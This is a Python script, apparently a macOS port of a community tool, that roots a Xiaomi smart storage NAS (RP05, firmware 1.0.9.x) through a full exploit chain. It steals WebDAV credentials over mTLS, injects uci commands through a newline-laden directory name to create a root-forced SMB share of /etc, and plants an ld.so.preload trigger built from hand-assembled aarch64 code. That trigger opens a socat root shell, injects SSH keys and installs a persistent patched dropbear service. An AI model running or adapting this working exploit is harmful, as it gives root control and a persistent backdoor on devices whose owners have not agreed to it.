#!/usr/bin/env python3
"""
xiaomi-nas-root-macos.py — 小米智能存储 (RP05, 固件 1.0.9.x) 一键获取 root（macOS 适配版）
上游: lvmaple/minas_plugin xiaomi-nas-root-tool-1.0.9.462（uci heredoc 注入链）
macOS 适配: SMB 改用 mount_smbfs、随机口令改为纯字母数字、清理不再依赖 GNU timeout。

用法:
    python xiaomi-nas-root-macos.py <NAS_IP>
    python xiaomi-nas-root-macos.py <NAS_IP> --uid <米家数字UID>
    python xiaomi-nas-root-macos.py <NAS_IP> --cert-dir "~/AppData/Local/minasCert"

前置条件:
    1. 本机已安装"小米智能存储"桌面端并登录过 NAS（证书目录默认自动查找）
    2. 依赖: python3 (标准库), keystone-engine (pip install keystone-engine)

敏感信息说明:
    - 证书目录默认搜索常见路径; 找不到时用 --cert-dir 指定
    - WebDAV 密码自动经 mTLS 调 get_pool_info 获取, 不落盘
    - SSH 密钥: 若 ~/.ssh/id_ed25519_minas 不存在则现场生成, 私钥只写本机

攻击链 (三步):
    ① mTLS 证书 → get_pool_info 拿 WebDAV 凭据
    ② WebDAV MKCOL 换行目录名 + netshare/add_samba_account uci heredoc 注入
       → force user=root 的 SMB /etc 共享 (root 任意文件写)
    ③ /etc/ld.so.preload + aarch64 触发 .so (keystone 现场汇编)
       → cron 每分钟 root 任务执行 → 装 socat root shell(2323) + dropbear(22)
注: socat root shell(2323) 不持久化; SSH 通过 minas-sshd.service 持久化(已 enable)。
     公钥与 root home 改动有意保留, 详见 README。
"""
import argparse
import base64
import json
import os
import re
import socket
import ssl
import subprocess
import sys
import time
import urllib.parse

SHELL_PORT = 2323

CERT_SEARCH = [
    os.path.expandvars(r"%LOCALAPPDATA%\minasCert") if os.name == "nt" else None,
    os.path.expanduser("~/AppData/Local/minasCert"),
    "/Applications/小米智能存储.app/Contents/Resources/extraResources/cert",
]

STEP = [0]


def log(kind, msg):
    colors = {"ok": "\033[32m", "warn": "\033[33m", "fail": "\033[31m", "info": ""}
    reset = "\033[0m"
    if kind == "step":
        STEP[0] += 1
        print("\n\033[1m[%02d] %s\033[0m" % (STEP[0], msg))
        return
    c = colors.get(kind, "")
    print("     %s%s: %s%s" % (c, kind.upper(), msg, reset))


def die(msg):
    log("fail", msg)
    sys.exit(1)


def find_cert_dir(explicit):
    if explicit:
        return explicit if os.path.isdir(explicit) else None
    for d in CERT_SEARCH:
        if d and os.path.isdir(d):
            pems = [f for f in os.listdir(d) if f.endswith("_cert.pem")]
            if pems:
                return d
    # broad search on windows
    for base in [os.path.expandvars(r"%LOCALAPPDATA%"), os.path.expandvars(r"%APPDATA%")]:
        if not base or "%" in base or not os.path.isdir(base):
            continue
        cand = os.path.join(base, "minasCert")
        if os.path.isdir(cand):
            return cand
    return None


class Nas:
    def __init__(self, ip, cert_dir):
        self.ip = ip
        self.cert_dir = cert_dir
        pems = [f for f in os.listdir(cert_dir) if f.endswith("_cert.pem")]
        if not pems:
            die("no *_cert.pem in %s" % cert_dir)
        self.base = pems[0][:-len("_cert.pem")]
        self.ca = os.path.join(cert_dir, "ca_chain.pem")
        self.cert = os.path.join(cert_dir, pems[0])
        self.key = os.path.join(cert_dir, self.base + "_private_key.pem")
        # 服务器 SNI：nas.<uid>.<did>.<角色>。角色段不在客户端证书里且证书 SAN 只精确匹配
        # 特定值（真机实测 .0 有效，.00/.2/.20/.1 均被拒），所以逐候选验证后取可用值。
        der = base64.b64decode(b"".join(
            open(self.cert, "rb").read().splitlines()[1:-1]))
        match = re.search(rb"nas\.[0-9]+\.[0-9a-f]+", der)
        if not match:
            die("cannot parse cert CN prefix")
        prefix = match.group(0).decode()
        self.sn = None
        for role in ("0", "00", "1", "2", "20"):
            candidate = f"{prefix}.{role}"
            raw = None
            try:
                probe = ssl.create_default_context(cafile=self.ca)
                probe.load_cert_chain(str(self.cert), str(self.key))
                raw = socket.create_connection((ip, 443), timeout=8)
                with probe.wrap_socket(raw, server_hostname=candidate) as ps:
                    ps.sendall(b"")  # 握手成功即可
                self.sn = candidate
                break
            except Exception:
                if raw is not None:
                    try:
                        raw.close()
                    except OSError:
                        pass
                continue
        if not self.sn:
            die("no working server CN (tried .0/.00/.1/.2/.20 suffixes)")
        self.uid = self.sn.split(".")[1]
        self.ctx = ssl.create_default_context(cafile=self.ca)
        self.ctx.load_cert_chain(self.cert, self.key)

    def https(self, path, body=None, timeout=15):
        raw = socket.create_connection((self.ip, 443), timeout=timeout)
        s = self.ctx.wrap_socket(raw, server_hostname=self.sn)
        if body is not None:
            if isinstance(body, (dict, list)):
                body = json.dumps(body).encode()
            elif isinstance(body, str):
                body = body.encode()
            req = ("POST %s HTTP/1.1\r\nHost: n\r\nConnection: close\r\n"
                   "Content-Type: application/json\r\nContent-Length: %d\r\n\r\n" % (path, len(body))).encode() + body
        else:
            req = ("GET %s HTTP/1.1\r\nHost: n\r\nConnection: close\r\n\r\n" % path).encode()
        s.sendall(req)
        chunks = []
        s.settimeout(timeout)
        # Connection: close 语义下服务器发完才关连接；超时多为网络慢，
        # 重试至收满（对 timeout 异常重试，对连接关闭/重置停止）
        idle = 0
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                idle += 1
                if idle >= 3:
                    break
                continue
            except OSError:
                break
            if not d:
                break
            idle = 0
            chunks.append(d)
        s.close()
        return b"".join(chunks)  # bytes：chunked 长度是字节数，解码必须在解块之后

    def json_body(self, resp):
        """按字节解码 chunked（长度行是字节数，先 decode 会错位），再解析 JSON。
        解析失败返回 {"raw": ..., "http_status": ...}（A4：调用方区分网络失败与业务失败）。"""
        if isinstance(resp, str):
            resp = resp.encode("utf-8", "surrogateescape")
        i = resp.find(b"\r\n\r\n")
        head, b = resp[:i], resp[i + 4:]
        status = head.split(b"\r\n")[0].decode("utf-8", "replace") if i >= 0 else ""
        if i >= 0 and b"chunked" in head.lower():
            out = b""
            while b:
                m = re.match(rb"([0-9a-fA-F]+)\r\n", b)
                if not m:
                    break
                size = int(m.group(1), 16)
                if size == 0:
                    break
                b = b[m.end():]
                out += b[:size]
                b = b[size + 2:]
            b = out
        text = b.decode("utf-8", "replace")
        try:
            parsed = json.loads(text.strip())
            if isinstance(parsed, dict):
                parsed["http_status"] = status.strip()
            return parsed
        except Exception:
            return {"raw": text[:200], "http_status": status.strip()}

    def webdav(self, method, path, body=None, auth=None, timeout=20):
        raw = socket.create_connection((self.ip, 5000), timeout=timeout)
        s = self.ctx.wrap_socket(raw, server_hostname=self.sn)
        hdrs = {"Host": "n", "Connection": "close"}
        if auth:
            hdrs["Authorization"] = auth
        if body is not None:
            if isinstance(body, str):
                body = body.encode()
            hdrs["Content-Length"] = str(len(body))
        req = "%s %s HTTP/1.1\r\n" % (method, path)
        req += "".join("%s: %s\r\n" % (k, v) for k, v in hdrs.items()) + "\r\n"
        s.sendall(req.encode())
        if body is not None:
            s.sendall(body)
        chunks = []
        s.settimeout(timeout)
        idle = 0
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                idle += 1
                if idle >= 3:
                    break
                continue
            except OSError:
                break
            if not d:
                break
            chunks.append(d)
        s.close()
        return b"".join(chunks).decode("utf-8", "replace")


def build_trigger_so(path_out):
    """assemble minimal aarch64 ET_DYN .so whose DT_INIT forks /bin/sh /etc/.rootpwn.sh"""
    try:
        from keystone import Ks, KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN
    except ImportError:
        die("keystone-engine missing: pip install keystone-engine")
    import struct

    ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)
    asm = (
        "init_fn:\n"
        "    mov x0, #17\n"
        "    mov x1, xzr\n"
        "    mov x2, xzr\n"
        "    mov x3, xzr\n"
        "    mov x4, xzr\n"
        "    mov x8, #220\n"
        "    svc #0\n"
        "    cbnz x0, done\n"
        "    adr x0, str_sh\n"
        "    adr x5, str_script\n"
        "    stp x0, x5, [sp, #-32]!\n"
        "    str xzr, [sp, #16]\n"
        "    mov x1, sp\n"
        "    mov x2, xzr\n"
        "    mov x8, #221\n"
        "    svc #0\n"
        "    mov x8, #93\n"
        "    mov x0, #127\n"
        "    svc #0\n"
        "done:\n"
        "    ret\n"
        "str_sh:\n"
        '    .ascii "/bin/sh\\0"\n'
        "str_script:\n"
        '    .ascii "/etc/.rootpwn.sh\\0"\n'
    )
    enc, cnt = ks.asm(asm)
    code = bytes(enc)

    NUM_PH = 2
    code_va = 0x1000
    data = bytearray(b"\x00" * 0x1000)
    data[code_va:code_va + len(code)] = code
    strtab_off = code_va + len(code)
    data += b"\x00"
    symtab_off = strtab_off + 1
    data += b"\x00" * 24
    dyn_off = symtab_off + 24

    dyn = b""
    dyn += struct.pack("<qQ", 12, code_va)      # DT_INIT
    dyn += struct.pack("<qQ", 5, strtab_off)    # DT_STRTAB
    dyn += struct.pack("<qQ", 6, symtab_off)    # DT_SYMTAB
    dyn += struct.pack("<qQ", 10, 1)            # DT_STRSZ
    dyn += struct.pack("<qQ", 11, 24)           # DT_SYMENT
    dyn += struct.pack("<qQ", 0, 0)             # DT_NULL
    data += dyn
    file_size = len(data)

    data[0:4] = b"\x7fELF"
    data[4] = 2
    data[5] = 1
    data[6] = 1
    struct.pack_into("<HHIQQQIHHHHHH", data, 16, 3, 0xB7, 1, 0, 64, 0, 0, 64, 56, NUM_PH, 0, 0, 0)

    def phdr(off, p_type, flags, off_in_file, filesz):
        data[off:off + 56] = struct.pack("<IIQQQQQQ", p_type, flags, off_in_file, off_in_file,
                                         off_in_file, filesz, filesz, 0x1000)

    phdr(64, 1, 5, 0, file_size)
    phdr(120, 2, 4, dyn_off, len(dyn))
    open(path_out, "wb").write(bytes(data))
    return file_size


def ssh_key_path():
    p = os.path.expanduser("~/.ssh/id_ed25519_minas")
    os.makedirs(os.path.dirname(p), exist_ok=True)
    if not os.path.exists(p):
        r = subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", p, "-N", "", "-C", "minas-root"],
                           capture_output=True)
        if r.returncode != 0:
            die("ssh-keygen failed: %s" % r.stderr.decode(errors="replace"))
        log("ok", "generated new key %s" % p)
    return p


def tcp_open(ip, port, timeout=3):
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def _smb_write_file(share, name, data, password):
    """经 root SMB 共享写文件（WebDAV 拒绝 /etc，实测 451）。Windows 用 net use 挂载；
    POSIX 挂 cifs 失败则报错让用户手动处理。幂等：重复挂载无妨。"""
    path = share + "\\" + name
    if os.name == "nt":
        # 先尝试直接写（Windows 对 UNC 路径可用已存凭据）
        try:
            with open(path, "wb") as f:
                f.write(data)
            return
        except OSError:
            pass
        # 未认证：挂载共享（用户 u<uid>，密码为步骤②创建共享时设置的）
        uid = share.rsplit("-", 1)[-1]
        subprocess.run(["net", "use", share, "/user:u" + uid, password],
                       capture_output=True, timeout=30)
        try:
            with open(path, "wb") as f:
                f.write(data)
        finally:
            subprocess.run(["net", "use", share, "/delete"], capture_output=True, timeout=30)
        return
    # POSIX / macOS: macOS 用 mount_smbfs（无 cifs 支持），Linux 仍用 mount -t cifs
    import tempfile
    mnt = tempfile.mkdtemp()
    uid = share.rsplit("-", 1)[-1]
    if sys.platform == "darwin":
        m = re.match(r"\\\\([^\\]+)\\(.+)", share)
        if not m:
            raise OSError("bad UNC path: %s" % share)
        host, sharename = m.group(1), m.group(2)
        url = "//u%s:%s@%s/%s" % (uid, password, host, sharename)
        # SMB 服务在 uci 变更后可能仍在重启，首次连接会超时；重试直至可用
        last = ""
        for attempt in range(6):
            res = subprocess.run(["mount_smbfs", url, mnt], capture_output=True, timeout=45)
            if res.returncode == 0:
                break
            last = res.stderr.decode(errors="replace").strip()
            time.sleep(5)
        else:
            os.rmdir(mnt)
            raise OSError("mount_smbfs failed: %s (请手动挂载 %s 后重试)" % (last[:200], share))
    else:
        res = subprocess.run(["mount", "-t", "cifs", share, mnt,
                              "-o", "username=u{},".format(uid) + "password=" + password],
                             capture_output=True, timeout=30)
        if res.returncode != 0:
            raise OSError("cifs mount failed: %s (请手动挂载 %s 后重试)" %
                          (res.stderr.decode(errors="replace")[:200], share))
    try:
        with open(os.path.join(mnt, name), "wb") as f:
            f.write(data)
    finally:
        subprocess.run(["umount", mnt], capture_output=True, timeout=30)
        os.rmdir(mnt)


def smb_share_name(nas):
    """共享名 = basename(修复后的 share_dir) + "-" + <数字uid>（真机实测：
    修复为 /etc 后共享名是 etc-<uid>，并非 staging 怪名）。查询失败返回 None。"""
    try:
        j = nas.json_body(nas.https("/cgi-bin/luci/netshare/get_samba_account", {}, timeout=30))
    except Exception:
        return None
    for a in (j.get("data") or {}).get("account") or []:
        if a.get("username") == "u" + nas.uid:
            sd = (a.get("share_dir") or [None])[0]
            if sd:
                return os.path.basename(sd.rstrip("/")) + "-" + nas.uid
    return None


def _disarm_command(uid, weird_name):
    """清理命令（成功与失败路径共用）。覆盖：preload/payload 文件、staging 怪名目录、
    注入的 samba 共享与系统用户。注意 authorized_keys 有意保留（SSH 认证通道）。"""
    return ("rm -f /etc/ld.so.preload /etc/pwn.so /etc/.rootpwn.sh /etc/.rootpwn.log; "
            "rm -rf '/home/u%s/pool0/data/%s'; "
            "uci delete sambashare.u%s_2; uci commit sambashare; "
            "uci delete sambauser.u%s_2 2>/dev/null; uci commit sambauser; "
            "sed -i '/sambau%s/d' /etc/passwd /etc/shadow 2>/dev/null; "
            "nas call smb_mgr.sh restart 2>/dev/null || systemctl restart smb nmb 2>/dev/null; "
            "echo CLEAN_OK"
            ) % (uid, weird_name.replace("'", "'\\''"), uid, uid, uid)


def _run_root(args, script, marker, timeout=180):
    """经 socat root shell 执行脚本。用原生 socket + base64，跨平台（不依赖 nc/timeout）。
    返回 (输出文本, 是否检测到执行完成标记)。"""
    s = socket.create_connection((args.ip, args.shell_port), timeout=10)
    s.settimeout(2)
    time.sleep(0.6)
    try:
        s.sendall(b"stty -echo 2>/dev/null\n")
    except OSError:
        pass
    time.sleep(0.3)
    b64 = base64.b64encode(script.encode()).decode()
    # 结尾标记在命令文本里被拆开（printf 的格式串与参数分开），避免把 PTY 回显的
    # 命令行误当成执行完成；只有真正执行后才会出现连续的 __MARKER__
    sentinel = "__%s__" % marker
    tail = "; printf '__%s__\\n' '%s'" % ("%s", marker)
    s.sendall(("echo %s | base64 -d | bash%s\n" % (b64, tail)).encode())
    buf = b""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            d = s.recv(65536)
        except socket.timeout:
            continue
        except OSError:
            break
        if not d:
            break
        buf += d
        if sentinel.encode() in buf:
            break
    try:
        s.close()
    except OSError:
        pass
    text = buf.decode("utf-8", "replace")
    return text, sentinel in text


SSH_FIX_BIN = r'''
set -e
mkdir -p /data/minas-ssh
cp /usr/sbin/dropbear /data/minas-ssh/dropbear.new
python3 - <<'PY'
p = "/data/minas-ssh/dropbear.new"
d = open(p, "rb").read()
open(p, "wb").write(d.replace(b"/usr/sbin/mi-shell", b"/bin/bash" + b"\x00" * 9))
PY
chmod 755 /data/minas-ssh/dropbear.new
mv /data/minas-ssh/dropbear.new /data/minas-ssh/dropbear
echo BIN_OK
'''

SSH_FIX_UNIT = r'''
set -e
cat > /etc/systemd/system/minas-sshd.service <<'EOF'
[Unit]
Description=Minas patched dropbear sshd
After=network-online.target
Wants=network-online.target
Conflicts=dropbear.socket

[Service]
ExecStart=/data/minas-ssh/dropbear -F -p 22 -r /etc/dropbear/dropbear_rsa_host_key -s
Restart=always
RestartSec=2

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl --no-block stop dropbear.socket
systemctl --no-block disable dropbear.socket
systemctl --no-block enable minas-sshd.service
systemctl --no-block restart minas-sshd.service
sleep 2
echo UNIT_OK
'''


def ensure_ssh(args, keyp):
    """固件把 dropbear 的登录 shell 硬编码为 /usr/sbin/mi-shell（只会打印 banner、
    忽略 -c），所以直接用 SSH 无法执行命令。这里把 dropbear 复制到 /data 并同长度
    替换该字符串为 /bin/bash，再用 systemd 单元在 22 端口拉起（/ 是只读 erofs）。"""
    if not tcp_open(args.ip, args.shell_port, timeout=3):
        log("warn", "root shell 不可达，跳过 SSH 修复")
        return False
    log("step", "修复 dropbear（mi-shell → /bin/bash）并安装 22 端口服务")
    out, ok = _run_root(args, SSH_FIX_BIN, "BIN_OK", timeout=90)
    if not ok:
        log("warn", "dropbear 二进制修复失败")
        return False
    out, ok = _run_root(args, SSH_FIX_UNIT, "UNIT_OK", timeout=120)
    if not ok:
        log("warn", "systemd 单元安装失败")
        return False
    time.sleep(3)
    r = subprocess.run(["ssh", "-o", "BatchMode=yes", "-o", "ConnectTimeout=8",
                        "-o", "StrictHostKeyChecking=accept-new", "-i", keyp,
                        "root@" + args.ip, "id"],
                       capture_output=True, text=True, timeout=30)
    if "uid=0" in (r.stdout or ""):
        log("ok", "SSH root 登录已可用（22 端口，命令可正常输出）")
        return True
    log("warn", "SSH 端口已起但验证失败：%s" % (r.stderr or r.stdout).strip()[:160])
    return False


def _cleanup_via_shell(args, disarm):
    """经 socat root shell 真正执行清理（成功与失败路径均调用）。
    自身绝不抛异常，失败降级为本地 cleanup-<ip>.sh + 完整手动命令。"""
    try:
        if tcp_open(args.ip, args.shell_port, timeout=3):
            out, _ = _run_root(args, disarm, "CLEAN_DONE", timeout=180)
            if "CLEAN_OK" in out:
                log("ok", "清理完成（preload/共享/staging 已清除）")
                return
            log("warn", "清理命令未返回 CLEAN_OK，降级到手动方式")
        _dump_manual_cleanup(args, disarm)
    except Exception as exc:  # 清理自身绝不能成为崩溃点
        log("warn", "清理流程异常（%s），请手动执行" % type(exc).__name__)
        _dump_manual_cleanup(args, disarm)


def _dump_manual_cleanup(args, disarm):
    """完整清理命令落地：写本地 cleanup-<ip>.sh（用户可经 SMB root 共享上传后 bash 执行），
    并全量打印（不截断）。"""
    try:
        script = "#!/bin/sh\n# xiaomi-nas-root-tool cleanup for %s\n%s\n" % (args.ip, disarm)
        local = "cleanup-%s.sh" % args.ip
        with open(local, "w", newline="\n") as f:
            f.write(script)
        log("warn", "自动清理不可用；完整清理命令已写入 %s（可经 SMB root 共享上传到 /etc 后执行）" % local)
    except OSError:
        pass
    print()
    log("warn", "手动清理命令（完整，任一 root 通道执行）：")
    print("    " + disarm)


def main():
    ap = argparse.ArgumentParser(description="Xiaomi NAS one-click root (RP05, fw 1.0.9.x)")
    ap.add_argument("ip")
    ap.add_argument("--uid", default=None, help="mi UID digits (default: parsed from cert)")
    ap.add_argument("--cert-dir", default=None, help="client cert dir (auto-searched by default)")
    ap.add_argument("--shell-port", type=int, default=SHELL_PORT)
    args = ap.parse_args()

    log("step", "定位客户端证书")
    cert_dir = find_cert_dir(args.cert_dir)
    if not cert_dir:
        die("cert dir not found; pass --cert-dir (App 安装目录下 minasCert)")
    log("ok", cert_dir)

    nas = Nas(args.ip, cert_dir)
    if args.uid:
        nas.uid = args.uid
    log("ok", "uid=%s sn=%s" % (nas.uid, nas.sn))

    # ---------- ① get WebDAV creds ----------
    log("step", "mTLS 获取 WebDAV 凭据 (get_pool_info)")
    j = nas.json_body(nas.https("/cgi-bin/luci/filemgr/get_pool_info", {"selector": ["webDAV"]}))
    wd = (j.get("data") or {}).get("webDAV") or {}
    if not wd.get("username"):
        die("get_pool_info failed: %s" % j)
    auth = "Basic " + base64.b64encode(("%s:%s" % (wd["username"], wd["password"])).encode()).decode()
    log("ok", "webdav user=%s port=%s (密码不显示)" % (wd["username"], wd.get("port")))

    # ---------- ② uci heredoc injection → root share ----------
    log("step", "uci 注入: 建立 force user=root 的 /etc SMB 共享")
    NL = chr(10)
    Q = chr(34)
    M30 = "M" * 30
    weird_name = (
        M30 + NL + Q + NL +
        "set sambashare.u%s_2.user_force=root" % nas.uid + NL +
        "set sambashare.u%s_2.create_mask=0644" % nas.uid + NL +
        "set sambashare.u%s_2.path=etc" % nas.uid + NL +
        "set sambashare.u%s_2.comment=" % nas.uid
    )
    enc = urllib.parse.quote(weird_name, safe="")
    # /pool0 为单池默认布局（get_pool_info 的 data_dir 即 /pool0/data）；多池设备需按实际调整
    r = nas.webdav("MKCOL", "/pool0/data/" + enc + "/", auth=auth)
    status = r.split("\r\n")[0]
    if not status.startswith("HTTP/1.1 201") and not status.startswith("HTTP/1.1 405"):
        die("MKCOL failed: %s" % status)
    log("ok", "staging dir created (newline-injected name)")

    weird_real = "/home/u%s/pool0/data/%s" % (nas.uid, weird_name)
    # 临时 SMB 口令每次运行随机生成（限内网、窗口仅几分钟，固定口令改为随机的防御纵深）
    # macOS mount_smbfs 的 URL 不做百分号解码，密码必须是纯字母数字，否则 @ : / 会错位
    import secrets
    smb_password = "Rp" + secrets.token_hex(10)
    j = nas.json_body(nas.https("/cgi-bin/luci/netshare/add_samba_account",
                                {"username": "u" + nas.uid, "password": smb_password,
                                 "share_dir": [weird_real]}, timeout=60))
    # add 失败不区分原因直接试 set（A4：原实现把解析失败当成功再叠加误判）；
    # id=2 是 smb_get_id 的固定结果（用户首个共享为 1，第二个为 2），非硬编码魔法数
    if j.get("code") not in (0, None):
        j = nas.json_body(nas.https("/cgi-bin/luci/netshare/set_samba_account",
                                    {"id": "2", "username": "u" + nas.uid, "password": smb_password,
                                     "share_dir": [weird_real]}, timeout=90))
    code = j.get("code")
    log("info" if code in (0, None) else "warn", "add_samba_account code=%s (2502 restart-fail 可继续)" % code)
    # note: restart failure is fine — the uci entries are already written; repair below
    time.sleep(5)

    # repair: point share to clean /etc path via set (keeps user_force=root)
    j = nas.json_body(nas.https("/cgi-bin/luci/netshare/set_samba_account",
                                {"id": "2", "username": "u" + nas.uid, "password": smb_password,
                                 "share_dir": ["/etc"]}, timeout=120))
    if j.get("code") not in (0, None) or " 20" not in j.get("http_status", ""):
        die("share repair failed: %s" % j)
    log("ok", "SMB /etc share active as user u%s (force user=root)" % nas.uid)

    # ---------- ③ preload trigger ----------
    log("step", "写入 /etc/ld.so.preload + 触发 .so (cron 每分钟生效)")
    keyp = ssh_key_path()
    pubkey = open(keyp + ".pub").read().strip()

    so_local = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pwn_trigger.so")
    build_trigger_so(so_local)
    log("ok", "trigger .so assembled (%d bytes)" % os.path.getsize(so_local))

    payload = "\n".join([
        "#!/bin/sh",
        "rm -f /etc/ld.so.preload",
        "echo \"PWN $(date) uid=$(id -u)\" >> /etc/.rootpwn.log",
        "mkdir -p /home/rootx/.ssh /etc/dropbear",
        "grep -q minas-root /home/rootx/.ssh/authorized_keys 2>/dev/null || echo '" + pubkey + "' >> /home/rootx/.ssh/authorized_keys",
        "grep -q minas-root /etc/dropbear/authorized_keys 2>/dev/null || echo '" + pubkey + "' >> /etc/dropbear/authorized_keys",
        "chmod 700 /home/rootx/.ssh /etc/dropbear",
        "chmod 600 /home/rootx/.ssh/authorized_keys /etc/dropbear/authorized_keys",
        "sed -i 's#^root:x:0:0:root:/root:#root:x:0:0:root:/home/rootx:#' /etc/passwd 2>/dev/null",
        "systemctl start dropbear.socket 2>/dev/null",
        "pgrep -f TCP-LISTEN:%d >/dev/null || nohup socat TCP-LISTEN:%d,reuseaddr,fork EXEC:\"/bin/bash -li\",pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &" % (args.shell_port, args.shell_port),
        "logger -t rootpwn root-shell-enabled",
    ])

    # /etc 写入走 SMB root 共享（WebDAV 路由层拒绝 /etc，实测 451）。
    # 共享名从 get_samba_account 现场取（真机实测修复后为 etc-<uid>），账号 u<uid>（步骤②创建）
    name = smb_share_name(nas) or ("etc-%s" % nas.uid)
    share = "\\\\%s\\%s" % (args.ip, name)
    log("info", "SMB share = %s" % share)
    disarm = _disarm_command(nas.uid, weird_name)
    try:
        _smb_write_file(share, ".rootpwn.sh", payload.encode(), smb_password)
        _smb_write_file(share, "pwn.so", open(so_local, "rb").read(), smb_password)
        log("ok", "payload + .so written to /etc (SMB root share)")
    except OSError as exc:
        # 中途失败：共享已建，必须清理后再 die
        _cleanup_via_shell(args, disarm)
        die("SMB write to %s failed: %s (net use %s /user:u%s %s 手动挂载排查)"
            % (share, exc, share, nas.uid, smb_password))
    try:
        _smb_write_file(share, "ld.so.preload", b"/etc/pwn.so\n", smb_password)
    except OSError as exc:
        _cleanup_via_shell(args, disarm)
        die("arm ld.so.preload failed: %s" % exc)
    log("ok", "ld.so.preload armed — waiting for cron (≤75s)")

    # 触发判据只认 socat 端口：22 端口可能因设备原有 dropbear.socket 已激活而误报
    t0 = time.time()
    got = False
    while time.time() - t0 < 90:
        if tcp_open(args.ip, args.shell_port):
            got = True
            break
        time.sleep(3)

    if not got:
        # 触发失败也必须清理（preload 永久布防会让全机动态进程反复加载）
        _cleanup_via_shell(args, disarm)
        die("trigger did not fire in 90s (socat port %d not open); cleanup attempted. "
            "若 22 端口已开或 /etc/.rootpwn.log 有新记录，说明触发实际成功、仅设备缺少 socat——"
            "此时公钥已注入，可走 SSH 认证通道" % args.shell_port)

    log("step", "验证 root 通道")
    ok22 = tcp_open(args.ip, 22)
    ok23 = tcp_open(args.ip, args.shell_port)
    log("ok" if ok22 else "warn", "SSH 22: %s" % ("OPEN" if ok22 else "closed"))
    log("ok" if ok23 else "warn", "root shell %d: %s" % (args.shell_port, "OPEN" if ok23 else "closed"))

    # 固件 dropbear 把登录 shell 硬编码成 mi-shell，修成 /bin/bash 并常驻 22 端口
    ssh_ok = ensure_ssh(args, keyp)

    # 成功后真正执行清理（经已就绪的 root shell）
    _cleanup_via_shell(args, disarm)

    print()
    print("\033[1m✅ root 获取完成\033[0m")
    print("   root shell:  nc %s %d" % (args.ip, args.shell_port))
    print("   SSH:        ssh -i %s root@%s" % (keyp, args.ip))
    print("   SSH 可用:   %s" % ("是（/data/minas-ssh/dropbear + minas-sshd.service，已 enable）"
                                if ssh_ok else "否（已保留 root shell，可手动排查）"))
    print("   重启后:     minas-sshd 开机自启；socat root shell(2323) 不自启，需要时重跑本脚本")


if __name__ == "__main__":
    main()
